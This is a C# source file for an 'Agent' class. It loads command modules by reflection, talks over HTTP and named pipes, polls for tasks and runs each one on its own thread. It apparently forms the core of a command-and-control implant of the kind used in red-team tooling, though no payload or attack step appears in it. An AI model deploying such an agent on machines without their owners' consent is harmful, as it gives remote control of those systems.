using Agent.Commands;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class Agent
    {
        public HttpCommModule HttpCommunicator { get; set; }
        public PipeCommModule PipeCommunicator { get; set; }
        private MessageManager _messageManager;
        private AgentMetadata _metadata;

        private CancellationTokenSource _tokenSource = new CancellationTokenSource();

        private List<AgentCommand> _commands = new List<AgentCommand>();

        public void LoadCoreAgentCommands()
        {
            var self = Assembly.GetExecutingAssembly();
            foreach (var type in self.GetTypes())
            {
                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = Activator.CreateInstance(type) as AgentCommand;
                    _commands.Add(instance);
                }
            }

        }

        public int LoadCommands(Assembly module)
        {
            int count = 0;
            foreach (var type in module.GetTypes())
            {

                if (type.IsSubclassOf(typeof(AgentCommand)))
                {
                    var instance = Activator.CreateInstance(type) as AgentCommand;
                    if (!_commands.Any(c => c.Name == instance.Name))
                    {
                        _commands.Add(instance);
                        count++;
                    }
                }
            }
            return count;
        }

        public Agent(AgentMetadata metadata)
        {
            _metadata = metadata;
            _messageManager = new MessageManager(metadata);

            this.HttpCommunicator = new HttpCommModule(_messageManager);
            this.PipeCommunicator = new PipeCommModule(_messageManager);

            LoadCoreAgentCommands();
        }


        public void Start()
        {

            while (!_tokenSource.IsCancellationRequested)
            {
                var messages = this._messageManager.GetMessageTasksForAgent(this._metadata.Id);
                if (messages.Any())
                {
                    foreach(var mess in messages)
                        HandleTask(mess.Items);
                }
                Thread.Sleep(100);
            }
        }


        public void Stop()
        {
            this._tokenSource.Cancel();
        }

        public void HandleTask(IEnumerable<AgentTask> tasks)
        {
            foreach (var task in tasks)
            {
                Thread t = new Thread(this.StartHandleTask);
                t.Start(task);
            }
        }

        public void StartHandleTask(object task)
        {
            this.HandleTask(task as AgentTask);
        }

        public void HandleTask(AgentTask task)
        {
            var command = this._commands.FirstOrDefault(c => c.Name == task.Command);

            AgentTaskResult result = null;

            if (command is null)
            {
                result = new AgentTaskResult()
                {
                    Id = task.Id,
                    Result = $"Agent has no {task.Command} command registered!",
                    Status = AgentResultStatus.Completed,
                };
                this._messageManager.SendResult(result);
            }
            else
                command.Execute(task, this, this._messageManager);
        }
    }
}
